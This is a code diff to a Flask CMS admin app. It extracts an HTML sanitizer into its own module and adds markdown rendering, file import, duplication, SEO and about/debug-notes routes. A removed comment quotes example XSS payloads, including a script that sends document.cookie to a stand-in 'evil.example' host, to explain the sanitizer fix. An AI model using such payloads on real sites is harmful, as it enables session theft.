@@ -232,7 +232,7 @@
 # hygiene gap defensively since it costs nothing: added a .gitignore
 # (never existed before, despite a code comment claiming
 # "gitignored-by-convention" since the H-1 round-2 fix) and a
-# packaging-exclusion note in docs/security-notes.md.
+# packaging-exclusion note in dev/security-notes.md.
 #
 # Real findings, fixed: N-2 (loopback site_url passed the M-6 empty-string
 # check silently — verified live that a build triggered through the
@@ -298,7 +298,7 @@
 # optional thumbnail param) into all 4 places that build feed items
 # (category archive, tag archive, homepage feed, Recent Posts widget),
 # plus a hero image on individual post pages. M-5: "debug" config setting
-# had zero consumers anywhere — removed (see docs/dead_code.md);
+# had zero consumers anywhere — removed (see dev/dead_code.md);
 # show_clock/show_greeting/accent_color/bg_color are NOT dead but only
 # affect the Termux CLI's separate export path, not this app's own Build
 # button — flagged inline in the Settings panel instead of leaving that
@@ -1338,6 +1338,8 @@ def page_to_dict(r):
         "author": r.get("author", ""), "featured_image": r.get("featured_image", ""),
         "parent_page_id": r.get("parent_page_id_fk"), "sort_order": r.get("sort_order", 0),
         "created_at": r.get("created_at"), "updated_at": r.get("updated_at"),
+        "excerpt": r.get("excerpt", ""),  # FEATURE #6 (2026-09-12)
+        "locked_at": r.get("locked_at") or "", "locked_by": r.get("locked_by") or "",  # FEATURE #5 (2026-09-12)
     }
 
 def post_to_dict(r):
@@ -1348,6 +1350,8 @@ def post_to_dict(r):
         "featured_image": r.get("featured_image", ""), "published_at": r.get("published_at", ""),
         "scheduled_at": r.get("scheduled_at", ""), "tag_ids": r.get("tag_ids") or [],
         "created_at": r.get("created_at"), "updated_at": r.get("updated_at"),
+        "excerpt": r.get("excerpt", ""),  # FEATURE #6 (2026-09-12)
+        "locked_at": r.get("locked_at") or "", "locked_by": r.get("locked_by") or "",  # FEATURE #5 (2026-09-12)
     }
 
 def cms_category_to_dict(r):
@@ -1668,245 +1672,103 @@ def delete_task_category(cid):
 
 # CMS: PAGES (public-hosting layer — lib_bejson_Management_content.py)
 
-# AUDIT FIX (L-4, round 2): the malformed "<H2O>Post Title Test</h2>" seed
-# was fixed as *data* in the round-1 pass, but nothing in the routes below
-# actually validated content_html on the way in — so a fresh instance of
-# the same bug class (unbalanced/mismatched tags) could be saved again at
-# any time, and was, when the seed was re-created. Minimal balanced-tag
-# lint at the point of save: reject a start/end tag mismatch (exactly what
-# "<H2O>…</h2>" is — an opening "h2o" tag closed by "h2") or a tag left
-# unclosed at the end of the content. Void elements (br/img/hr/etc.) and
-# self-closing tags are exempt, as is anything that isn't valid-enough
-# HTML to tokenize as tags at all (plain text, markdown source) — this is
-# a lint against broken *tags*, not a strict HTML validator.
-from html.parser import HTMLParser as _HTMLParser
-import html as _html_mod
+# CMS content_html/content_markdown safety pipeline (balanced-tag lint,
+# AUDIT FIX SEC-01 sanitizer, FEATURE #2 markdown render) -- EXTRACTED
+# (2026-09-26) to lib_bejson_Management_content_safety.py so
+# lib_bejson_Management_cli.py's page/post create/update can run the
+# exact same pipeline this app's own /api/pages*//api/posts* routes
+# always have, instead of bypassing it entirely (a real stored-XSS gap
+# for CLI-authored content). _lint_content_html/_sanitize_content_html/
+# _render_markdown are unchanged from their former in-file definitions
+# -- every call site below this point is untouched. See that module's
+# own docstring for the full before/after.
+from lib_bejson_Management_content_safety import _lint_content_html, _sanitize_content_html, _render_markdown
 
-def management_cms_shared_esc(text) -> str:
+def _parse_front_matter(text: str):
     """
-    Local copy of lib_bejson_Management_shared.py's own
-    management_cms_shared_esc() — app.py doesn't otherwise import that
-    module (it's the export-time library, this is the admin app), and
-    pulling in the whole module for one function isn't worth the
-    coupling. Kept in exact parity (same stdlib call, same quote=True)
-    with the original; if that one changes, update this too.
+    FEATURE #15 (2026-09-12): minimal front-matter extraction for .md
+    imports (see import_page()/import_post() below) — not a YAML parser
+    (avoids adding pyyaml as a dependency; same Termux/stdlib-only
+    reasoning _render_markdown() above already gives). Only supports
+    flat "key: value" lines inside a leading "---\\n...\\n---" block;
+    nested maps/lists are out of scope and would just be kept as a
+    literal string value, not parsed further. Returns
+    (front_matter_dict, remaining_body) — front_matter_dict is {} and
+    body is the original text unchanged if no front-matter block is
+    present at the very start of the file.
     """
-    return _html_mod.escape(str(text or ""), quote=True)
+    text = text.lstrip("\ufeff")
+    m = re.match(r"^---\s*\n(.*?)\n---\s*\n?", text, flags=re.DOTALL)
+    if not m:
+        return {}, text
+    fm = {}
+    for line in m.group(1).split("\n"):
+        line = line.strip()
+        if not line or line.startswith("#") or ":" not in line:
+            continue
+        key, _, val = line.partition(":")
+        key = key.strip().lower()
+        val = val.strip().strip('"').strip("'")
+        if key:
+            fm[key] = val
+    return fm, text[m.end():]
 
-_VOID_ELEMENTS = frozenset((
-    "area", "base", "br", "col", "embed", "hr", "img", "input",
-    "link", "meta", "param", "source", "track", "wbr",
-))
-
-class _ContentHtmlLinter(_HTMLParser):
-    def __init__(self):
-        super().__init__(convert_charrefs=True)
-        self.stack = []
-        self.issues = []
-    def handle_starttag(self, tag, attrs):
-        if tag not in _VOID_ELEMENTS:
-            self.stack.append(tag)
-    def handle_startendtag(self, tag, attrs):
-        pass  # self-closing (<tag/>) — never pushed, nothing to balance
-    def handle_endtag(self, tag):
-        if self.stack and self.stack[-1] == tag:
-            self.stack.pop()
-        elif tag in self.stack:
-            # Closes an ancestor further up — treat everything in between
-            # as implicitly closed (matches real browser/HTML5 recovery
-            # behavior for cases like unclosed <li>/<p>) rather than
-            # flagging every legitimate omitted-closing-tag pattern.
-            while self.stack and self.stack[-1] != tag:
-                self.stack.pop()
-            if self.stack:
-                self.stack.pop()
-        else:
-            self.issues.append(f"</{tag}> has no matching opening tag")
-
-def _lint_content_html(html_str: str):
-    """Returns a list of human-readable problems (empty = OK)."""
-    if not html_str or not html_str.strip():
-        return []
-    linter = _ContentHtmlLinter()
+def _import_content(kind: str):
+    """
+    FEATURE #15 (2026-09-12): shared by import_page()/import_post() —
+    the .md/.html parsing and sanitization is identical either way, only
+    which create_* function runs at the end differs. No magic-byte
+    sniffing here (unlike upload_media()'s AUDIT FIX H-4 above) — these
+    are read as text and go through the exact same
+    _lint_content_html() -> _sanitize_content_html() pipeline as any
+    hand-typed content_html, which is the actual security boundary for
+    markup regardless of where it came from; extension is only used to
+    pick a parser, not trusted for anything security-relevant.
+    Always creates as status="draft" — an import is never auto-published,
+    review is expected before that happens either way.
+    """
+    f = request.files.get("file")
+    if not f or not f.filename:
+        return jsonify({"error": "No file provided"}), 400
+    safe_filename = secure_filename(f.filename)
+    if not safe_filename:
+        return jsonify({"error": "Invalid filename"}), 400
+    ext = os.path.splitext(safe_filename)[1].lower()
+    if ext not in (".md", ".html"):
+        return jsonify({"error": "Only .md and .html files are supported"}), 400
     try:
-        linter.feed(html_str)
-        linter.close()
-    except Exception:
-        return []  # not well-formed enough to tokenize as HTML at all — not this lint's job
-    issues = list(linter.issues)
-    if linter.stack:
-        issues.append(f"unclosed tag(s): {', '.join('<'+t+'>' for t in linter.stack)}")
-    return issues
+        raw = f.read().decode("utf-8")
+    except UnicodeDecodeError:
+        return jsonify({"error": "File is not valid UTF-8 text"}), 400
 
-# AUDIT FIX (SEC-01): _lint_content_html() above only ever checked tag
-# BALANCE — it happily accepted, and this app happily stored and
-# published verbatim to Export/ (a public website), things like
-# <script>fetch('https://evil.example/?c='+document.cookie)</script>,
-# <img src=x onerror="...">, and <a href="javascript:alert(1)">. Today's
-# blast radius is bounded (only an authenticated admin can inject), but
-# a leaked token, a future multi-user mode, or imported content all turn
-# this into real stored XSS on a public site.
-#
-# nh3 (the audit's suggested library) was evaluated and deliberately NOT
-# used: it's a Rust extension distributed only as prebuilt wheels for
-# manylinux/glibc targets, and this project's actual deployment target
-# is Termux on Android, which uses Bionic libc, not glibc — the same
-# platform-mismatch class of problem already hit (and avoided) with
-# hash-pinning in requirements.txt (see that file's own comment). Adding
-# nh3 risked breaking `pip install` on-device, which is worse than not
-# sanitizing at all. This sanitizer is stdlib-only (html.parser, same
-# module the linter above already depends on), so it carries zero new
-# platform risk.
-#
-# Runs as a SECOND, independent pass after _lint_content_html() at every
-# save site — lint rejects clearly broken markup with an actionable
-# error (so an author sees why their save failed); sanitize then defangs
-# anything that passed lint but still isn't an allowed tag/attribute/URL
-# scheme, so a save can never silently persist an executable payload.
-_SANITIZE_ALLOWED_TAGS = frozenset((
-    "p", "b", "i", "em", "strong", "u", "s", "a",
-    "h1", "h2", "h3", "h4", "h5", "h6",
-    "ul", "ol", "li", "br", "hr", "img", "blockquote", "pre", "code",
-    "figure", "figcaption", "table", "thead", "tbody", "tr", "th", "td",
-    "span", "sub", "sup",
-))
-# Tags whose CONTENT must also be discarded, not just the tag itself —
-# unlike e.g. a stripped <div>, the text inside <script>/<style> was
-# never meant to be visible page content.
-_SANITIZE_STRIP_CONTENT_TAGS = frozenset(("script", "style", "noscript"))
-_SANITIZE_ALLOWED_ATTRS = {
-    "a": frozenset(("href", "title")),
-    "img": frozenset(("src", "alt", "width", "height")),
-    "td": frozenset(("colspan", "rowspan")),
-    "th": frozenset(("colspan", "rowspan")),
-}
-_SANITIZE_URL_ATTRS = frozenset(("href", "src"))
-_SANITIZE_ALLOWED_SCHEMES = frozenset(("http", "https", "mailto"))
+    title, slug = "", ""
+    if ext == ".md":
+        front_matter, body = _parse_front_matter(raw)
+        title = front_matter.get("title", "")
+        slug = front_matter.get("slug", "")
+        content_html = _render_markdown(body)
+    else:
+        content_html = raw
+        m = re.search(r"<title[^>]*>(.*?)</title>", raw, flags=re.IGNORECASE | re.DOTALL)
+        if not m:
+            m = re.search(r"<h1[^>]*>(.*?)</h1>", raw, flags=re.IGNORECASE | re.DOTALL)
+        if m:
+            title = re.sub(r"<[^>]+>", "", m.group(1)).strip()
+    if not title:
+        title = os.path.splitext(safe_filename)[0]
 
-def _sanitize_is_safe_url(value: str) -> bool:
-    value = (value or "").strip()
-    if not value:
-        return False
-    # A scheme is everything before the first ':' PROVIDED it looks like
-    # scheme:rest per RFC 3986 (letters/digits/+/-/. only) — anything
-    # else (a bare relative path like "/media/x.png", "posts/x.html",
-    # or a path containing a literal colon with no valid scheme syntax
-    # before it, e.g. "a:b/c") is treated as schemeless/relative, which
-    # is safe and is how nearly every real link/image in this app's own
-    # content is written.
-    colon = value.find(":")
-    if colon == -1:
-        return True  # relative URL, no scheme at all
-    scheme = value[:colon]
-    if not re.match(r"^[A-Za-z][A-Za-z0-9+.\-]*$", scheme):
-        return True  # not a valid scheme syntax -> treat as relative/safe
-    return scheme.lower() in _SANITIZE_ALLOWED_SCHEMES
+    issues = _lint_content_html(content_html)
+    if issues:
+        return jsonify({"error": "Imported content has malformed markup: " + "; ".join(issues)}), 400
+    sanitized = _sanitize_content_html(content_html)
 
-class _ContentHtmlSanitizer(_HTMLParser):
-    def __init__(self):
-        super().__init__(convert_charrefs=True)
-        self.out = []
-        # Stack of (tag, kept: bool) so end tags only close what their
-        # matching start tag actually did, and so content inside a
-        # dropped script/style can be suppressed until its real end tag.
-        self.stack = []
-        self.skip_depth = 0  # >0 while inside a dropped script/style/noscript
-
-    def _emit_starttag(self, tag, attrs, self_closing):
-        if tag in _SANITIZE_STRIP_CONTENT_TAGS:
-            if not self_closing:
-                self.stack.append((tag, False))
-                self.skip_depth += 1
-            return
-        if self.skip_depth > 0:
-            # Inside a stripped script/style — track nesting of the same
-            # tag name so an inner <script> doesn't end the skip early,
-            # but don't emit anything.
-            if not self_closing:
-                self.stack.append((tag, False))
-            return
-        if tag not in _SANITIZE_ALLOWED_TAGS:
-            # Drop the tag, keep processing its children as if unwrapped
-            # (e.g. a stripped <div>'s text content is still real page
-            # content and should survive).
-            if not self_closing:
-                self.stack.append((tag, False))
-            return
-        allowed_attrs = _SANITIZE_ALLOWED_ATTRS.get(tag, frozenset())
-        kept_attrs = []
-        for name, val in attrs:
-            name = (name or "").lower()
-            if name not in allowed_attrs:
-                continue  # silently drops onerror=, onclick=, style=, etc. for every tag
-            if name in _SANITIZE_URL_ATTRS and not _sanitize_is_safe_url(val or ""):
-                continue  # drops javascript:/data:/etc. — the tag itself survives without this attr
-            kept_attrs.append(f'{name}="{management_cms_shared_esc(val or "")}"')
-        attr_str = (" " + " ".join(kept_attrs)) if kept_attrs else ""
-        if self_closing or tag in _VOID_ELEMENTS:
-            self.out.append(f"<{tag}{attr_str}>")
-        else:
-            self.out.append(f"<{tag}{attr_str}>")
-            self.stack.append((tag, True))
-
-    def handle_starttag(self, tag, attrs):
-        self._emit_starttag(tag.lower(), attrs, self_closing=False)
-
-    def handle_startendtag(self, tag, attrs):
-        self._emit_starttag(tag.lower(), attrs, self_closing=True)
-
-    def handle_endtag(self, tag):
-        tag = tag.lower()
-        if not self.stack:
-            return
-        # Find the matching open entry from the top, same recovery
-        # approach as the linter above (closes everything back to the
-        # matching tag rather than only ever popping exactly one).
-        for idx in range(len(self.stack) - 1, -1, -1):
-            if self.stack[idx][0] == tag:
-                while len(self.stack) > idx:
-                    popped_tag, was_kept = self.stack.pop()
-                    if popped_tag in _SANITIZE_STRIP_CONTENT_TAGS:
-                        self.skip_depth -= 1
-                    elif was_kept:
-                        self.out.append(f"</{popped_tag}>")
-                break
-            # tag not found in stack at all -- stray end tag, ignore
-
-    def handle_data(self, data):
-        if self.skip_depth > 0:
-            return
-        self.out.append(management_cms_shared_esc(data))
-
-    def close_out(self):
-        # Anything still open at EOF (matches the linter's own
-        # "unclosed tag" tolerance) — close kept tags so output stays
-        # well-formed rather than leaking an unclosed element.
-        while self.stack:
-            popped_tag, was_kept = self.stack.pop()
-            if popped_tag in _SANITIZE_STRIP_CONTENT_TAGS:
-                self.skip_depth -= 1
-            elif was_kept:
-                self.out.append(f"</{popped_tag}>")
-        return "".join(self.out)
-
-def _sanitize_content_html(html_str: str) -> str:
-    """
-    Defangs content_html for storage: unknown tags are unwrapped (their
-    text kept), disallowed attributes (onerror=, onclick=, style=, etc.)
-    are dropped, disallowed URL schemes (javascript:, data:, etc.) on
-    href=/src= are dropped, and <script>/<style>/<noscript> are removed
-    tag-and-content. Always call AFTER _lint_content_html() has already
-    accepted the input — this doesn't validate structure, only content.
-    """
-    if not html_str or not html_str.strip():
-        return html_str or ""
-    sanitizer = _ContentHtmlSanitizer()
-    try:
-        sanitizer.feed(html_str)
-        sanitizer.close()
-    except Exception:
-        return ""  # unparseable — fail closed rather than store something unvetted
-    return sanitizer.close_out()
+    if kind == "page":
+        new_id = CmsContent.management_cms_content_create_page(
+            str(CMS_MANIFESTS["cms_page"]), title, slug=slug, status="draft", content_html=sanitized)
+    else:
+        new_id = CmsContent.management_cms_content_create_post(
+            str(CMS_MANIFESTS["cms_post"]), title, slug=slug, status="draft", content_html=sanitized)
+    return jsonify({"ok": True, "id": new_id})
 
 @app.route("/api/pages", methods=["GET"])
 def list_pages():
@@ -1919,6 +1781,12 @@ def create_page():
     d = request.get_json(silent=True) or {}
     if not d.get("title"):
         return jsonify({"error": "title is required"}), 400
+    # FEATURE #2 (2026-09-12): markdown-authored content. Only kicks in
+    # when content_html itself is blank — an explicit content_html value
+    # is treated as authorial intent and always wins (matches the same
+    # "explicit HTML wins" rule applied on update, below).
+    if d.get("content_markdown") and not d.get("content_html"):
+        d["content_html"] = _render_markdown(d["content_markdown"])
     # AUDIT FIX (L-4, round 2): reject malformed content_html at save time.
     issues = _lint_content_html(d.get("content_html", ""))
     if issues:
@@ -1934,13 +1802,20 @@ def create_page():
         author=d.get("author", ""), featured_image=d.get("featured_image", ""),
         parent_page_id_fk=d.get("parent_page_id"), sort_order=d.get("sort_order", 0),
         status=d.get("status", "draft"), content_html=sanitized_content_html,
-        content_markdown=d.get("content_markdown", ""),
+        content_markdown=d.get("content_markdown", ""), excerpt=d.get("excerpt", ""),
     )
     return jsonify({"ok": True, "id": pid})
 
 @app.route("/api/pages/<pid>", methods=["PUT"])
 def update_page(pid):
     d = request.get_json(silent=True) or {}
+    # FEATURE #2 (2026-09-12): same "explicit HTML wins, else re-render
+    # markdown" rule as create_page() above. Setting d["content_html"]
+    # here (a plain dict assignment) is what makes the existing
+    # `"content_html" in d` check below pick it up and run it through
+    # the normal lint/sanitize/whitelist path unchanged.
+    if d.get("content_markdown") and not d.get("content_html"):
+        d["content_html"] = _render_markdown(d["content_markdown"])
     # AUDIT FIX (L-4, round 2): reject malformed content_html on update too.
     if "content_html" in d:
         issues = _lint_content_html(d.get("content_html", ""))
@@ -1952,7 +1827,7 @@ def update_page(pid):
     fields = {k: v for k, v in d.items() if k in (
         "title", "slug", "category_id_fk", "page_type", "meta_description", "layout",
         "content_html", "content_markdown", "author", "featured_image",
-        "parent_page_id_fk", "sort_order", "status")}
+        "parent_page_id_fk", "sort_order", "status", "excerpt", "locked_at", "locked_by")}
     if not CmsContent.management_cms_content_update_page(str(CMS_MANIFESTS["cms_page"]), pid, **fields):
         return jsonify({"error": "Not found"}), 404
     return jsonify({"ok": True})
@@ -1962,6 +1837,66 @@ def delete_page(pid):
     if not CmsContent.management_cms_content_delete_page(str(CMS_MANIFESTS["cms_page"]), pid):
         return jsonify({"error": "Not found"}), 404
     return jsonify({"ok": True})
+
+@app.route("/api/pages/<pid>/duplicate", methods=["POST"])
+def duplicate_page(pid):
+    """
+    FEATURE #9 (2026-09-12): pure composition of the existing create —
+    no new library function. Deliberately does NOT set created_at/
+    updated_at/published_at itself: management_cms_content_create_page()
+    already stamps those internally (see its own "now" handling), same
+    as any other new page, so the copy gets a genuinely fresh timestamp
+    rather than inheriting the original's. slug gets a "-copy" suffix;
+    if duplicated more than once, or if a page already ends in "-copy",
+    a resulting collision is caught by #21's canonical-URL check at the
+    next build (see management_cms_static_build()'s seen_urls/
+    _check_url_collision) rather than silently overwritten — this route
+    doesn't itself enforce slug uniqueness, matching create_page()'s own
+    behavior of not enforcing it either.
+    """
+    src = CmsContent.management_cms_content_get_page(str(CMS_MANIFESTS["cms_page"]), page_id=pid)
+    if not src:
+        return jsonify({"error": "Not found"}), 404
+    new_id = CmsContent.management_cms_content_create_page(
+        str(CMS_MANIFESTS["cms_page"]), (src.get("title") or "") + " (Copy)",
+        slug=(src.get("slug") or "") + "-copy",
+        category_id_fk=src.get("category_id_fk"), page_type=src.get("page_type", "content"),
+        meta_description=src.get("meta_description", ""), layout=src.get("layout", "default"),
+        author=src.get("author", ""), featured_image=src.get("featured_image", ""),
+        parent_page_id_fk=src.get("parent_page_id_fk"), sort_order=src.get("sort_order", 0),
+        status="draft", content_html=src.get("content_html", ""),
+        content_markdown=src.get("content_markdown", ""), excerpt=src.get("excerpt", ""),
+    )
+    return jsonify({"ok": True, "id": new_id})
+
+@app.route("/api/pages/import", methods=["POST"])
+def import_page():
+    return _import_content("page")
+
+@app.route("/api/pages/<pid>/seo", methods=["GET"])
+def get_page_seo(pid):
+    """FEATURE #16 (2026-09-12): seo_get/seo_set/PAGE_SEO_FIELDS already
+    existed in lib_bejson_Management_content.py before this feature —
+    only these routes, the static_builder.py consumption, and the
+    editor panel were actually missing. Returns an empty template (not
+    404) when no PageSeo row exists yet, so the editor can always
+    populate a form."""
+    seo = CmsContent.management_cms_content_seo_get(str(CMS_MANIFESTS["cms_page"]), pid)
+    if not seo:
+        return jsonify({"meta_title": "", "meta_keywords": "", "og_title": "", "og_description": "",
+                         "og_image": "", "canonical_url": "", "robots_directive": ""})
+    return jsonify({k: seo.get(k, "") for k in (
+        "meta_title", "meta_keywords", "og_title", "og_description",
+        "og_image", "canonical_url", "robots_directive")})
+
+@app.route("/api/pages/<pid>/seo", methods=["PUT"])
+def set_page_seo(pid):
+    d = request.get_json(silent=True) or {}
+    fields = {k: v for k, v in d.items() if k in (
+        "meta_title", "meta_keywords", "og_title", "og_description",
+        "og_image", "canonical_url", "robots_directive")}
+    seo_id = CmsContent.management_cms_content_seo_set(str(CMS_MANIFESTS["cms_page"]), pid, **fields)
+    return jsonify({"ok": True, "id": seo_id})
 
 # CMS: POSTS
 
@@ -1978,6 +1913,9 @@ def create_post():
     d = request.get_json(silent=True) or {}
     if not d.get("title"):
         return jsonify({"error": "title is required"}), 400
+    # FEATURE #2 (2026-09-12): see create_page()'s matching comment.
+    if d.get("content_markdown") and not d.get("content_html"):
+        d["content_html"] = _render_markdown(d["content_markdown"])
     # AUDIT FIX (L-4, round 2): reject malformed content_html at save time.
     issues = _lint_content_html(d.get("content_html", ""))
     if issues:
@@ -1991,13 +1929,17 @@ def create_post():
         category_id_fk=d.get("category_id_fk", d.get("category_id")), tag_ids=d.get("tag_ids"),
         author=d.get("author", ""), featured_image=d.get("featured_image", ""),
         status=d.get("status", "draft"), content_html=sanitized_content_html,
-        content_markdown=d.get("content_markdown", ""), scheduled_at=d.get("scheduled_at", ""),
+        content_markdown=d.get("content_markdown", ""), excerpt=d.get("excerpt", ""),
+        scheduled_at=d.get("scheduled_at", ""),
     )
     return jsonify({"ok": True, "id": pid})
 
 @app.route("/api/posts/<pid>", methods=["PUT"])
 def update_post(pid):
     d = request.get_json(silent=True) or {}
+    # FEATURE #2 (2026-09-12): see update_page()'s matching comment.
+    if d.get("content_markdown") and not d.get("content_html"):
+        d["content_html"] = _render_markdown(d["content_markdown"])
     # AUDIT FIX (L-4, round 2): reject malformed content_html on update too.
     if "content_html" in d:
         issues = _lint_content_html(d.get("content_html", ""))
@@ -2008,7 +1950,7 @@ def update_post(pid):
         d["content_html"] = _sanitize_content_html(d["content_html"])
     fields = {k: v for k, v in d.items() if k in (
         "title", "slug", "category_id_fk", "tag_ids", "author", "featured_image",
-        "status", "content_html", "content_markdown", "scheduled_at")}
+        "status", "content_html", "content_markdown", "scheduled_at", "excerpt", "locked_at", "locked_by")}
     if not CmsContent.management_cms_content_update_post(str(CMS_MANIFESTS["cms_post"]), pid, **fields):
         return jsonify({"error": "Not found"}), 404
     return jsonify({"ok": True})
@@ -2018,6 +1960,26 @@ def delete_post(pid):
     if not CmsContent.management_cms_content_delete_post(str(CMS_MANIFESTS["cms_post"]), pid):
         return jsonify({"error": "Not found"}), 404
     return jsonify({"ok": True})
+
+@app.route("/api/posts/<pid>/duplicate", methods=["POST"])
+def duplicate_post(pid):
+    """FEATURE #9 (2026-09-12): see duplicate_page()'s matching comment."""
+    src = CmsContent.management_cms_content_get_post(str(CMS_MANIFESTS["cms_post"]), post_id=pid)
+    if not src:
+        return jsonify({"error": "Not found"}), 404
+    new_id = CmsContent.management_cms_content_create_post(
+        str(CMS_MANIFESTS["cms_post"]), (src.get("title") or "") + " (Copy)",
+        slug=(src.get("slug") or "") + "-copy",
+        category_id_fk=src.get("category_id_fk"), tag_ids=src.get("tag_ids") or [],
+        author=src.get("author", ""), featured_image=src.get("featured_image", ""),
+        status="draft", content_html=src.get("content_html", ""),
+        content_markdown=src.get("content_markdown", ""), excerpt=src.get("excerpt", ""),
+    )
+    return jsonify({"ok": True, "id": new_id})
+
+@app.route("/api/posts/import", methods=["POST"])
+def import_post():
+    return _import_content("post")
 
 @app.route("/api/posts/<pid>/publish", methods=["POST"])
 def publish_post(pid):
@@ -2492,6 +2454,53 @@ def get_config():
 def update_config():
     data = request.get_json(silent=True) or {}
     Config.management_config_save(SCRIPT_PATH, data)
+    return jsonify({"ok": True})
+
+# ABOUT / DEBUG NOTES (policy S9.2: Web Applications/Flask deliverables
+# require an About/Info section — credit, name, description, version,
+# date — and a Debug section with a persistent text box synced to
+# dev/persistent-notes.md, auto-saving to file. Neither existed before
+# this remediation pass.)
+
+_PROJECT_TRACKER_FILE = SCRIPT_PATH / "bejson_project.json"
+_PERSISTENT_NOTES_FILE = SCRIPT_PATH / "dev" / "persistent-notes.md"
+
+@app.route("/api/about", methods=["GET"])
+def get_about():
+    """
+    Reads identity fields straight from bejson_project.json rather than
+    hardcoding them a second time in app.py — Package_Version bumps on
+    every delivery, so a hardcoded copy here would drift out of sync
+    within one package.
+    """
+    try:
+        with open(_PROJECT_TRACKER_FILE, encoding="utf-8") as f:
+            tracker = json.load(f)
+        fields = [x["name"] for x in tracker["Fields"]]
+        row = tracker["Values"][0]
+        get = lambda name: row[fields.index(name)] if name in fields else ""
+        return jsonify({
+            "name": get("Project_Name"), "description": get("Description") or get("Project_Description"),
+            "version": get("Project_Version"), "package_version": tracker.get("Package_Version", get("Package_Version")),
+            "date": get("Project_Modified_Date"),
+            "author": "Elton Boehnen", "author_email": "boehnenelton2024@gmail.com",
+            "author_site": "boehnenelton2024.pages.dev", "author_github": "github.com/boehnenelton",
+        })
+    except Exception as e:
+        return jsonify({"error": f"Could not read project tracker: {e}"}), 500
+
+@app.route("/api/debug-notes", methods=["GET"])
+def get_debug_notes():
+    if not _PERSISTENT_NOTES_FILE.exists():
+        return jsonify({"content": ""})
+    return jsonify({"content": _PERSISTENT_NOTES_FILE.read_text(encoding="utf-8")})
+
+@app.route("/api/debug-notes", methods=["PUT"])
+def set_debug_notes():
+    data = request.get_json(silent=True) or {}
+    content = data.get("content", "")
+    _PERSISTENT_NOTES_FILE.parent.mkdir(parents=True, exist_ok=True)
+    _PERSISTENT_NOTES_FILE.write_text(content, encoding="utf-8")
     return jsonify({"ok": True})
 
 # FACTORY RESET
